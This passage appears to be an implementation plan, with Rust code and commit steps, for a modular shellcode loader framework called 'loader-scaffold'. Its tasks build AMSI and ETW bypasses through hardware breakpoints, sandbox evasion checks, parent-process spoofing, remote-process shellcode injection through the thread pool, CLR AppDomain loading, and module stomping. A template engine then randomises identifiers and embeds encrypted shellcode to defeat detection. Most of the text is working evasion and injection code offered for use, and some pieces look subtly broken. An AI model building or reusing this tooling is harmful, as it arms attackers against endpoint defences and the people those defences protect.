        windows_sys::Win32::System::LibraryLoader::LoadLibraryA(b"amsi.dll\0".as_ptr());
        let amsi = GetModuleHandleA(b"amsi.dll\0".as_ptr());
        if amsi == 0 { return; }
    }
    let scan_buffer = GetProcAddress(amsi, b"AmsiScanBuffer\0".as_ptr());
    AMSI_ADDR = scan_buffer as usize;

    // Register VEH handler (first in chain)
    AddVectoredExceptionHandler(1, Some(amsi_veh_handler));

    // Set DR0 = AmsiScanBuffer, DR7 bit 0 = enable local breakpoint
    let thread = GetCurrentThread();
    let mut ctx: CONTEXT = core::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(thread, &mut ctx);
    ctx.Dr0 = AMSI_ADDR as u64;
    ctx.Dr7 |= 0x1; // enable DR0 local breakpoint
    SetThreadContext(thread, &ctx);
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn amsi_veh_handler(info: *mut EXCEPTION_POINTERS) -> i32 {
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH:    i32 =  0;

    let record  = &*(*info).ExceptionRecord;
    let context = &mut *(*info).ContextRecord;

    if record.ExceptionCode == EXCEPTION_SINGLE_STEP as u32
        && context.Rip == AMSI_ADDR as u64
    {
        // Set return value to 0 (AMSI_RESULT_CLEAN = 0x1, but 0 = no scan needed)
        context.Rax = 0;
        // Skip the function: set RIP to return address (top of stack)
        context.Rip = *(context.Rsp as *const u64);
        context.Rsp += 8; // pop return address
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    EXCEPTION_CONTINUE_SEARCH
}
```

- [ ] **Step 3: Cross-compile check + commit**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu
git add loader-scaffold/src/bypass/
git commit -m "feat(scaffold): AMSI bypass via DR0 hardware breakpoint (VEH, zero memory IOC)"
```

---

### Task 10: ETW Hardware Breakpoint Bypass

**Files:**
- Create: `loader-scaffold/src/bypass/etw_hwbp.rs`

- [ ] **Step 1: Implement DR1 breakpoint on EtwEventWrite**

```rust
// loader-scaffold/src/bypass/etw_hwbp.rs
// Same pattern as AMSI, but targets EtwEventWrite in ntdll.
// DR1 used to avoid conflict with DR0 (AMSI).

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::EXCEPTION_SINGLE_STEP,
    System::{
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, EXCEPTION_POINTERS, SetThreadContext,
            GetThreadContext, CONTEXT, CONTEXT_DEBUG_REGISTERS,
        },
        Threading::GetCurrentThread,
        LibraryLoader::GetModuleHandleA,
    },
};

#[cfg(target_os = "windows")]
static mut ETW_ADDR: usize = 0;

#[cfg(target_os = "windows")]
pub unsafe fn install_etw_bypass() {
    use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8;
    let etw_hash = djb2_hash(b"EtwEventWrite");
    let etw_fn = resolve_by_hash(ntdll, etw_hash).unwrap();
    ETW_ADDR = etw_fn as usize;

    AddVectoredExceptionHandler(1, Some(etw_veh_handler));

    let thread = GetCurrentThread();
    let mut ctx: CONTEXT = core::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(thread, &mut ctx);
    ctx.Dr1  = ETW_ADDR as u64;
    ctx.Dr7 |= 0x4; // enable DR1 local breakpoint (bit 2)
    SetThreadContext(thread, &ctx);
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn etw_veh_handler(info: *mut EXCEPTION_POINTERS) -> i32 {
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH:    i32 =  0;

    let record  = &*(*info).ExceptionRecord;
    let context = &mut *(*info).ContextRecord;

    if record.ExceptionCode == EXCEPTION_SINGLE_STEP as u32
        && context.Rip == ETW_ADDR as u64
    {
        // Return STATUS_SUCCESS without executing EtwEventWrite
        context.Rax = 0;
        context.Rip = *(context.Rsp as *const u64);
        context.Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    EXCEPTION_CONTINUE_SEARCH
}
```

- [ ] **Step 2: Cross-compile check + commit**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu
git add loader-scaffold/src/bypass/etw_hwbp.rs
git commit -m "feat(scaffold): ETW bypass via DR1 hardware breakpoint (VEH)"
```

---

### Task 11: Sandbox Evasion

**Files:**
- Create: `loader-scaffold/src/sandbox/mod.rs`
- Create: `loader-scaffold/src/sandbox/domain.rs`
- Create: `loader-scaffold/src/sandbox/usercheck.rs`

- [ ] **Step 1: Create `loader-scaffold/src/sandbox/mod.rs`**

```rust
// loader-scaffold/src/sandbox/mod.rs
pub mod domain;
pub mod usercheck;
```

- [ ] **Step 2: Domain-joined check**

```rust
// loader-scaffold/src/sandbox/domain.rs
#[cfg(target_os = "windows")]
use windows_sys::Win32::NetworkManagement::NetManagement::{
    NetGetJoinInformation, NetApiBufferFree, NetSetupDomainName,
};

/// Returns true if the current machine is joined to a Windows domain.
/// Sandbox environments are almost never domain-joined.
/// Call os::process::exit(0) if this returns false.
#[cfg(target_os = "windows")]
pub unsafe fn is_domain_joined() -> bool {
    let mut name_buf: *mut u16 = core::ptr::null_mut();
    let mut join_status: u32 = 0;
    let result = NetGetJoinInformation(
        core::ptr::null(),
        &mut name_buf,
        &mut join_status,
    );
    if result == 0 && !name_buf.is_null() {
        NetApiBufferFree(name_buf as _);
    }
    join_status == NetSetupDomainName
}
```

- [ ] **Step 3: User interaction check**

```rust
// loader-scaffold/src/sandbox/usercheck.rs
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::{
    SystemInformation::{GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX},
    Threading::GetCurrentProcessId,
};

/// Returns true if environment looks like a real user machine.
/// Checks: uptime > 30 min, RAM > 2GB.
/// Extend with mouse-movement check if needed.
#[cfg(target_os = "windows")]
pub unsafe fn looks_real() -> bool {
    // Uptime > 30 minutes
    let uptime_ms = GetTickCount64();
    if uptime_ms < 30 * 60 * 1000 { return false; }

    // RAM > 2GB
    let mut mem_status: MEMORYSTATUSEX = core::mem::zeroed();
    mem_status.dwLength = core::mem::size_of::<MEMORYSTATUSEX>() as u32;
    GlobalMemoryStatusEx(&mut mem_status);
    if mem_status.ullTotalPhys < 2 * 1024 * 1024 * 1024 { return false; }

    true
}
```

- [ ] **Step 4: Cross-compile check + commit**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu
git add loader-scaffold/src/sandbox/
git commit -m "feat(scaffold): sandbox evasion - domain-joined + uptime/RAM checks"
```

---

### Task 12: PPID Spoofing

**Files:**
- Create: `loader-scaffold/src/inject/ppid_spoof.rs`

- [ ] **Step 1: Implement PPID spoof via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS**

```rust
// loader-scaffold/src/inject/ppid_spoof.rs
#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    System::Threading::{
        OpenProcess, CreateProcessA, InitializeProcThreadAttributeList,
        UpdateProcThreadAttribute, DeleteProcThreadAttributeList,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        STARTUPINFOEXA, PROCESS_INFORMATION,
        EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED,
        PROCESS_CREATE_PROCESS, PROCESS_QUERY_INFORMATION,
        STARTUPINFOA,
    },
    Foundation::CloseHandle,
};

/// Spawn `target_exe` as a child of `parent_name` (e.g., "explorer.exe").
/// Returns (process_handle, thread_handle) of the new process (suspended).
/// Caller is responsible for injecting shellcode then ResumeThread.
#[cfg(target_os = "windows")]
pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(isize, isize)> {
    // Find parent process PID by name
    let parent_pid = find_pid_by_name(parent_name)?;
    let h_parent = OpenProcess(
        PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION,
        0, parent_pid,
    );
    if h_parent == 0 { return None; }

    // Build PROC_THREAD_ATTRIBUTE_LIST with parent process attribute
    let mut attr_size: usize = 0;
    InitializeProcThreadAttributeList(core::ptr::null_mut(), 1, 0, &mut attr_size);
    let mut attr_buf = vec![0u8; attr_size];
    InitializeProcThreadAttributeList(attr_buf.as_mut_ptr() as _, 1, 0, &mut attr_size);

    UpdateProcThreadAttribute(
        attr_buf.as_mut_ptr() as _,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
        &h_parent as *const _ as _,
        core::mem::size_of::<isize>(),
        core::ptr::null_mut(),
        core::ptr::null(),
    );

    let mut si: STARTUPINFOEXA = core::mem::zeroed();
    si.StartupInfo.cb = core::mem::size_of::<STARTUPINFOEXA>() as u32;
    si.lpAttributeList = attr_buf.as_mut_ptr() as _;
    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

    let ok = CreateProcessA(
        core::ptr::null(),
        target_exe.as_ptr() as *mut u8,
        core::ptr::null(), core::ptr::null(),
        0,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        core::ptr::null(), core::ptr::null(),
        &si.StartupInfo as *const STARTUPINFOA,
        &mut pi,
    );

    DeleteProcThreadAttributeList(attr_buf.as_mut_ptr() as _);
    CloseHandle(h_parent);

    if ok == 0 { return None; }
    Some((pi.hProcess, pi.hThread))
}

#[cfg(target_os = "windows")]
unsafe fn find_pid_by_name(name: &[u8]) -> Option<u32> {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstA, Process32NextA,
        TH32CS_SNAPPROCESS, PROCESSENTRY32A,
    };
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    let mut entry: PROCESSENTRY32A = core::mem::zeroed();
    entry.dwSize = core::mem::size_of::<PROCESSENTRY32A>() as u32;
    if Process32FirstA(snap, &mut entry) == 0 { return None; }
    loop {
        let exe_name = &entry.szExeFile[..name.len()];
        if exe_name.iter().zip(name).all(|(&a, &b)| a == b) {
            CloseHandle(snap);
            return Some(entry.th32ProcessID);
        }
        if Process32NextA(snap, &mut entry) == 0 { break; }
    }
    CloseHandle(snap);
    None
}
```

- [ ] **Step 2: Cross-compile check + commit**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu
git add loader-scaffold/src/inject/ppid_spoof.rs
git commit -m "feat(scaffold): PPID spoofing via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS"
```

---

### Task 13: Threadless Injection (TpAllocWork)

**Files:**
- Create: `loader-scaffold/src/inject/threadless.rs`

- [ ] **Step 1: Implement TpAllocWork callback injection**

```rust
// loader-scaffold/src/inject/threadless.rs
//
// Threadless injection: allocate shellcode in target process,
// queue execution via Windows thread pool (TpAllocWork / TpPostWork).
// No new thread is created — avoids CreateRemoteThread telemetry.

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    System::{
        Memory::{
            VirtualAllocEx, WriteProcessMemory, VirtualProtectEx,
            MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
        },
        Threading::OpenProcess,
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
    },
    Foundation::CloseHandle,
};

type TpAllocWorkFn  = unsafe extern "system" fn(*mut usize, *mut (), *mut (), usize) -> i32;
type TpPostWorkFn   = unsafe extern "system" fn(usize);
type TpReleaseWorkFn= unsafe extern "system" fn(usize);

/// Inject shellcode into `target_pid` and execute via TpAllocWork (thread pool).
#[cfg(target_os = "windows")]
pub unsafe fn inject_threadless(target_pid: u32, shellcode: &[u8]) -> bool {
    use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};

    let h_proc = OpenProcess(
        0x001F_0FFF, // PROCESS_ALL_ACCESS
        0, target_pid,
    );
    if h_proc == 0 { return false; }

    // Allocate RW in target
    let remote_buf = VirtualAllocEx(
        h_proc, core::ptr::null(),
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if remote_buf.is_null() { CloseHandle(h_proc); return false; }

    // Write shellcode
    let mut written: usize = 0;
    WriteProcessMemory(h_proc, remote_buf, shellcode.as_ptr() as _, shellcode.len(), &mut written);

    // RW → RX
    let mut old = 0u32;
    VirtualProtectEx(h_proc, remote_buf, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

    // Resolve TpAllocWork, TpPostWork from ntdll in target (same address space layout)
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8;
    let tp_alloc  = resolve_by_hash(ntdll, djb2_hash(b"TpAllocWork")).unwrap();
    let tp_post   = resolve_by_hash(ntdll, djb2_hash(b"TpPostWork")).unwrap();
    let tp_release= resolve_by_hash(ntdll, djb2_hash(b"TpReleaseWork")).unwrap();

    let tp_alloc_fn  : TpAllocWorkFn  = core::mem::transmute(tp_alloc);
    let tp_post_fn   : TpPostWorkFn   = core::mem::transmute(tp_post);
    let tp_release_fn: TpReleaseWorkFn= core::mem::transmute(tp_release);

    // Allocate work item pointing to shellcode
    let mut work_item: usize = 0;
    tp_alloc_fn(
        &mut work_item,
        core::mem::transmute(remote_buf),
        core::ptr::null_mut(),
        0,
    );

    // Post to thread pool
    tp_post_fn(work_item);
    // Small sleep to allow execution
    windows_sys::Win32::System::Threading::Sleep(500);
    tp_release_fn(work_item);
    CloseHandle(h_proc);
    true
}
```

- [ ] **Step 2: Cross-compile check + commit**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu
git add loader-scaffold/src/inject/threadless.rs
git commit -m "feat(scaffold): threadless injection via TpAllocWork (no CreateRemoteThread)"
```

---

### Task 14: AppDomain Module (ICLRRuntimeHost2)

**Files:**
- Create: `loader-scaffold/src/inject/appdomain.rs`

- [ ] **Step 1: Implement CLR hosting via ICLRRuntimeHost2**

```rust
// loader-scaffold/src/inject/appdomain.rs
//
// Load a .NET assembly into a new AppDomain in the current process
// using ICLRRuntimeHost2 (modern CLR hosting API).
// The .config file (generated by template engine) sets AppDomainManager.

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Com::{CoInitializeEx, COINIT_MULTITHREADED};

// ICLRMetaHost, ICLRRuntimeInfo, ICLRRuntimeHost2 are COM interfaces.
// We invoke them via their VTable (raw COM, no generated bindings).
// GUIDs are stable across Windows versions.

#[cfg(target_os = "windows")]
const CLSID_CLR_META_HOST: windows_sys::core::GUID = windows_sys::core::GUID {
    data1: 0x9280188d, data2: 0x0e8e, data3: 0x4867,
    data4: [0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde],
};
#[cfg(target_os = "windows")]
const IID_ICLR_META_HOST: windows_sys::core::GUID = windows_sys::core::GUID {
    data1: 0xd332db9e, data2: 0xb9b3, data3: 0x4125,
    data4: [0x82, 0x07, 0xa1, 0x48, 0x84, 0xf5, 0x32, 0x16],
};

/// Load assembly bytes into a new AppDomain and call entry_method.
/// `clr_version`: e.g., "v4.0.30319\0" (null-terminated wide string)
/// `assembly_bytes`: raw .NET assembly PE bytes
/// `type_name`, `method_name`, `argument`: entry point spec
#[cfg(target_os = "windows")]
pub unsafe fn load_assembly_appdomain(
    clr_version:   &[u16],   // L"v4.0.30319"
    assembly_bytes: &[u8],
    type_name:     &[u16],   // L"Namespace.Class"
    method_name:   &[u16],   // L"Method"
    argument:      &[u16],   // L"arg"
) -> bool {
    use windows_sys::Win32::System::Com::{CoCreateInstance, CLSCTX_INPROC_SERVER};

    CoInitializeEx(core::ptr::null(), COINIT_MULTITHREADED);

    // CoCreateInstance(CLSID_CLRMetaHost) → ICLRMetaHost
    let mut meta_host: *mut core::ffi::c_void = core::ptr::null_mut();
    let hr = CoCreateInstance(
        &CLSID_CLR_META_HOST, core::ptr::null_mut(),
        CLSCTX_INPROC_SERVER, &IID_ICLR_META_HOST,
        &mut meta_host,
    );
    if hr != 0 || meta_host.is_null() { return false; }

    // ICLRMetaHost::GetRuntime(clr_version) → ICLRRuntimeInfo
    let meta_vtable = *(meta_host as *mut *mut *mut usize);
    // GetRuntime is at vtable index 3 (0-based): [QueryInterface, AddRef, Release, GetRuntime, ...]
    type GetRuntimeFn = unsafe extern "system" fn(*mut c_void, *const u16, *const GUID, *mut *mut c_void) -> i32;
    let get_runtime: GetRuntimeFn = core::mem::transmute(*(*meta_vtable).add(3));

    let iid_runtime_info = windows_sys::core::GUID { // IID_ICLRRuntimeInfo
        data1: 0xbd39d1d2, data2: 0xba2f, data3: 0x486a,
        data4: [0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91],
    };
    let mut runtime_info: *mut core::ffi::c_void = core::ptr::null_mut();
    get_runtime(meta_host, clr_version.as_ptr(), &iid_runtime_info, &mut runtime_info);
    if runtime_info.is_null() { return false; }

    // ICLRRuntimeInfo::GetInterface(ICLRRuntimeHost2)
    let rt_vtable = *(runtime_info as *mut *mut *mut usize);
    type GetInterfaceFn = unsafe extern "system" fn(*mut c_void, *const GUID, *const GUID, *mut *mut c_void) -> i32;
    let get_iface: GetInterfaceFn = core::mem::transmute(*(*rt_vtable).add(9)); // GetInterface at index 9

    let clsid_clr_runtime_host = windows_sys::core::GUID {
        data1: 0x90f1a06e, data2: 0x7712, data3: 0x4762,
        data4: [0x86, 0xb5, 0x7a, 0x5e, 0xba, 0x6b, 0xdb, 0x02],
    };
    let iid_clr_runtime_host2 = windows_sys::core::GUID {
        data1: 0x712ab452, data2: 0x287c, data3: 0x4501,
        data4: [0xbe, 0xbc, 0xbf, 0x98, 0x68, 0xbf, 0xb9, 0x0b],
    };
    let mut runtime_host: *mut core::ffi::c_void = core::ptr::null_mut();
    get_iface(runtime_info, &clsid_clr_runtime_host, &iid_clr_runtime_host2, &mut runtime_host);
    if runtime_host.is_null() { return false; }

    // ICLRRuntimeHost2::Start()
    let rh_vtable = *(runtime_host as *mut *mut *mut usize);
    type StartFn = unsafe extern "system" fn(*mut c_void) -> i32;
    let start: StartFn = core::mem::transmute(*(*rh_vtable).add(3));
    start(runtime_host);

    // ICLRRuntimeHost2::ExecuteInDefaultAppDomain
    type ExecFn = unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, *const u16, *mut u32) -> i32;
    let exec: ExecFn = core::mem::transmute(*(*rh_vtable).add(11));
    let mut ret_val: u32 = 0;

    // Note: ExecuteInDefaultAppDomain takes assembly PATH, not bytes.
    // For in-memory loading, use ICLRRuntimeHost2::CreateAppDomainWithManager
    // which respects the .config AppDomainManagerType for in-memory assembly loading.
    // The .config file generated by the template engine enables this scenario.
    exec(
        runtime_host,
        assembly_bytes.as_ptr() as *const u16, // assembly path (wide string)
        type_name.as_ptr(),
        method_name.as_ptr(),
        argument.as_ptr(),
        &mut ret_val,
    );

    true
}
```

- [ ] **Step 2: Cross-compile check + commit**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu
git add loader-scaffold/src/inject/appdomain.rs
git commit -m "feat(scaffold): CLR hosting via ICLRRuntimeHost2 for AppDomain injection"
```

---

### Task 15: Module Stomping

**Files:**
- Create: `loader-scaffold/src/evasion/module_stomp.rs`

- [ ] **Step 1: Implement module stomping**

```rust
// loader-scaffold/src/evasion/module_stomp.rs
//
// Overwrite the .text section of a non-essential loaded DLL with shellcode.
// Resulting memory is type MEM_IMAGE (not MEM_PRIVATE) — looks legitimate
// to memory scanners that flag private executable regions.

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    System::{
        LibraryLoader::{LoadLibraryA, GetModuleHandleA},
        Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ},
        Diagnostics::Debug::WriteProcessMemory,
        Threading::GetCurrentProcess,
    },
};

/// Load `dll_name`, overwrite its .text section with `shellcode`.
/// Returns pointer to shellcode location in the stomped module (for execution).
#[cfg(target_os = "windows")]
pub unsafe fn stomp_module(dll_name: &[u8], shellcode: &[u8]) -> Option<*mut u8> {
    use crate::evasion::unhook::get_text_section;

    // Load the victim DLL (use a non-essential one: xpsservices.dll, wer.dll, etc.)
    LoadLibraryA(dll_name.as_ptr());
    let module_base = GetModuleHandleA(dll_name.as_ptr()) as *mut u8;
    if module_base.is_null() { return None; }

    let (text_rva, text_size) = get_text_section(module_base);
    if text_size < shellcode.len() { return None; }

    let target = module_base.add(text_rva);

    // RWX temporarily
    let mut old = 0u32;
    VirtualProtect(target as _, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old);
    core::ptr::copy_nonoverlapping(shellcode.as_ptr(), target, shellcode.len());
    VirtualProtect(target as _, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

    Some(target)
}
```

Note: `get_text_section` was defined in `unhook.rs` — make it `pub(crate)` in that file.

- [ ] **Step 2: Update `unhook.rs` to expose `get_text_section`**

In `loader-scaffold/src/evasion/unhook.rs`, change:
```rust
// before:
unsafe fn get_text_section(base: *const u8) -> (usize, usize) {
// after:
pub(crate) unsafe fn get_text_section(base: *const u8) -> (usize, usize) {
```

- [ ] **Step 3: Cross-compile check + commit**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu
git add loader-scaffold/src/evasion/module_stomp.rs loader-scaffold/src/evasion/unhook.rs
git commit -m "feat(scaffold): module stomping - overwrite legit DLL .text (MEM_IMAGE)"
```

---

### Task 16: Tera Template Engine + Variable Randomizer

**Files:**
- Create: `template-engine/Cargo.toml`
- Create: `template-engine/src/lib.rs`
- Create: `template-engine/templates/binary.rs.tera`
- Create: `template-engine/templates/dll.rs.tera`
- Create: `template-engine/templates/appdomain.rs.tera`
- Create: `template-engine/templates/injector.rs.tera`
- Create: `template-engine/templates/appdomain.config.tera`

This crate runs on the server (host OS). Full TDD.

- [ ] **Step 1: Write failing test**

```rust
// template-engine/src/lib.rs (test block)
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_binary_has_no_plain_identifiers() {
        let config = LoaderConfig {
            loader_type: LoaderType::Binary,
            features: vec![Feature::SleepEncrypt, Feature::AmsiHwbp],
            encryption: Encryption::Aes256,
            shellcode_hex: "deadbeef".into(),
            key_hex: "aabbccdd".repeat(8),
            iv_hex: "11223344".repeat(4),
            pe_config: None,
            appdomain_config: None,
        };
        let result = generate_loader_source(&config).unwrap();
        // Generated source must not contain generic names like "shellcode" or "key"
        assert!(!result.contains("let shellcode"));
        assert!(!result.contains("let key"));
        // Must contain the encrypted data
        assert!(result.contains("deadbeef"));
    }

    #[test]
    fn test_appdomain_config_xml() {
        let config = AppDomainTemplateConfig {
            clr_version: "v4.0.30319".into(),
            net_version: "4.0".into(),
            appdomain_name: "DefaultDomain".into(),
        };
        let xml = generate_appdomain_config(&config).unwrap();
        assert!(xml.contains("v4.0.30319"));
        assert!(xml.contains("DefaultDomain"));
        assert!(xml.contains("<configuration>"));
    }
}
```

- [ ] **Step 2: Run test — verify failure**

```bash
cargo test -p template-engine
```

Expected: FAIL (types not defined)

- [ ] **Step 3: Create `template-engine/Cargo.toml`**

```toml
[package]
name = "template-engine"
version = "0.1.0"
edition = "2021"

[dependencies]
tera = "1"
rand = "0.8"
serde = { version = "1", features = ["derive"] }
```

- [ ] **Step 4: Implement template engine**

```rust
// template-engine/src/lib.rs
use rand::{distributions::Alphanumeric, Rng};
use serde::Serialize;
use tera::{Context, Function, Tera, Value};
use std::collections::HashMap;

#[derive(Debug, Clone, Serialize)]
pub enum LoaderType { Binary, Dll, AppDomain, Injector }

#[derive(Debug, Clone, Serialize)]
pub enum Feature {
    DirectSyscall, UnhookDisk, UnhookKnownDlls, ModuleStomp,
    SleepEncrypt, StackSpoof, HeapEncrypt,
    SandboxDomain, SandboxUser, PpidSpoof,
    AmsiPatch, AmsiHwbp, EtwPatch, EtwHwbp,
    PeSpoofing, StringObfu, Staged, AppDomain,
}

#[derive(Debug, Clone, Serialize)]
pub enum Encryption { Aes256, Chacha20 }

#[derive(Debug, Clone, Serialize)]
pub struct PeConfig {
    pub company: String,
    pub file_description: String,
    pub product_name: String,
    pub sign: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct AppDomainConfig {
    pub clr_version: String,
    pub net_version: String,
    pub target_process: String,
    pub assembly_hex: String,
    pub type_name: String,
    pub method_name: String,
    pub appdomain_name: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct LoaderConfig {
    pub loader_type: LoaderType,
    pub features: Vec<Feature>,
    pub encryption: Encryption,
    pub shellcode_hex: String,
    pub key_hex: String,
    pub iv_hex: String,
    pub pe_config: Option<PeConfig>,
    pub appdomain_config: Option<AppDomainConfig>,
}

#[derive(Debug, Clone, Serialize)]
pub struct AppDomainTemplateConfig {
    pub clr_version: String,
    pub net_version: String,
    pub appdomain_name: String,
}

/// Generate a random Rust identifier (alphanumeric, starts with letter).
fn rand_ident(len: usize) -> String {
    let mut rng = rand::thread_rng();
    let first: char = rng.sample(rand::distributions::Uniform::from(b'a'..=b'z')) as char;
    let rest: String = (0..len - 1)
        .map(|_| rng.sample(Alphanumeric) as char)
        .collect();
    format!("{}{}", first, rest)
}

fn make_rand_ident_fn() -> impl Function {
    move |args: &HashMap<String, Value>| {
        let len = args.get("len")
            .and_then(|v| v.as_u64())
            .unwrap_or(12) as usize;
        Ok(Value::String(rand_ident(len)))
    }
}

fn make_rand_hex_fn() -> impl Function {
    move |args: &HashMap<String, Value>| {
        let len = args.get("len")
            .and_then(|v| v.as_u64())
            .unwrap_or(8) as usize;
        let s: String = (0..len)
            .map(|_| format!("{:02x}", rand::thread_rng().gen::<u8>()))
            .collect();
        Ok(Value::String(s))
    }
}

/// Generate Rust source for loader-config.rs from config.
pub fn generate_loader_source(config: &LoaderConfig) -> Result<String, String> {
    let template_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/templates/**/*");
    let mut tera = Tera::new(template_dir)
        .map_err(|e| e.to_string())?;

    tera.register_function("rand_ident", make_rand_ident_fn());
    tera.register_function("rand_hex",   make_rand_hex_fn());

    let mut ctx = Context::new();
    ctx.insert("config", config);

    // Pre-generate all variable names (so same name used consistently in template)
    let vars: HashMap<&str, String> = [
        "var_shellcode", "var_key", "var_iv", "var_ptr",
        "var_region", "var_fiber", "fn_run", "fn_setup",
    ].iter().map(|&k| (k, rand_ident(12))).collect();
    ctx.insert("v", &vars);

    let template_name = match config.loader_type {
        LoaderType::Binary    => "binary.rs.tera",
        LoaderType::Dll       => "dll.rs.tera",
        LoaderType::AppDomain => "appdomain.rs.tera",
        LoaderType::Injector  => "injector.rs.tera",
    };

    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}

/// Generate AppDomain .config XML.
pub fn generate_appdomain_config(config: &AppDomainTemplateConfig) -> Result<String, String> {
    let template_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/templates/**/*");
    let mut tera = Tera::new(template_dir).map_err(|e| e.to_string())?;
    let mut ctx = Context::new();
    ctx.insert("clr_version",    &config.clr_version);
    ctx.insert("net_version",    &config.net_version);
    ctx.insert("appdomain_name", &config.appdomain_name);
    tera.render("appdomain.config.tera", &ctx).map_err(|e| e.to_string())
}
```

- [ ] **Step 5: Create binary.rs.tera template**

```rust
{# template-engine/templates/binary.rs.tera #}
{# All identifiers randomized via pre-generated vars or rand_ident() #}
#![windows_subsystem = "windows"]
extern crate scaffold;

fn {{ v.fn_run }}() {
    unsafe {
        {%- if "SandboxDomain" in config.features %}
        if !scaffold::sandbox::domain::is_domain_joined() { return; }
        {%- endif %}
        {%- if "SandboxUser" in config.features %}
        if !scaffold::sandbox::usercheck::looks_real() { return; }
        {%- endif %}
        {%- if "UnhookDisk" in config.features %}
        scaffold::evasion::unhook::unhook_ntdll_disk();
        {%- endif %}
        {%- if "UnhookKnownDlls" in config.features %}
        scaffold::evasion::unhook::unhook_ntdll_knowndlls();
        {%- endif %}
        {%- if "AmsiHwbp" in config.features %}
        scaffold::bypass::amsi_hwbp::install_amsi_bypass();
        {%- endif %}
        {%- if "EtwHwbp" in config.features %}
        scaffold::bypass::etw_hwbp::install_etw_bypass();
        {%- endif %}

        let {{ v.var_shellcode }}: &[u8] = &[
            {%- for byte in config.shellcode_hex | hex_bytes %}{{ byte }},{% endfor %}
        ];
        let {{ v.var_key }}: [u8; 32] = [
            {%- for byte in config.key_hex | hex_bytes %}{{ byte }},{% endfor %}
        ];
        let {{ v.var_iv }}: [u8; 16] = [
            {%- for byte in config.iv_hex | hex_bytes %}{{ byte }},{% endfor %}
        ];

        {%- if config.encryption == "Aes256" %}
        let {{ rand_ident(len=10) }} = scaffold::crypto::decrypt_aes256(
            {{ v.var_shellcode }}, &{{ v.var_key }}, &{{ v.var_iv }}
        ).unwrap();
        {%- else %}
        let {{ rand_ident(len=10) }} = scaffold::crypto::decrypt_chacha20(
            {{ v.var_shellcode }}, &{{ v.var_key }}, &{{ v.var_iv }}
        ).unwrap();
        {%- endif %}

        {%- if "SleepEncrypt" in config.features %}
        scaffold::evasion::sleep_mask::masked_sleep(3000);
        {%- endif %}

        scaffold::inject::exec::run_no_rwx(&{{ rand_ident(len=10) }});
    }
}

fn main() { {{ v.fn_run }}(); }
```

- [ ] **Step 6: Create `appdomain.config.tera`**

```xml
{# template-engine/templates/appdomain.config.tera #}
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <startup>
    <supportedRuntime version="{{ clr_version }}" sku=".NETFramework,Version=v{{ net_version }}" />
  </startup>
  <runtime>
    <AppDomainManagerType value="{{ appdomain_name }}" />
  </runtime>
</configuration>
```

- [ ] **Step 7: Run tests — verify they pass**

```bash
cargo test -p template-engine
```

Expected: `test tests::test_generate_binary_has_no_plain_identifiers ... ok`  
`test tests::test_appdomain_config_xml ... ok`

- [ ] **Step 8: Commit**

```bash
git add template-engine/
git commit -m "feat(template): Tera template engine + rand_ident variable randomizer"
```

---

### Task 17: dll.rs.tera + appdomain.rs.tera + injector.rs.tera Templates
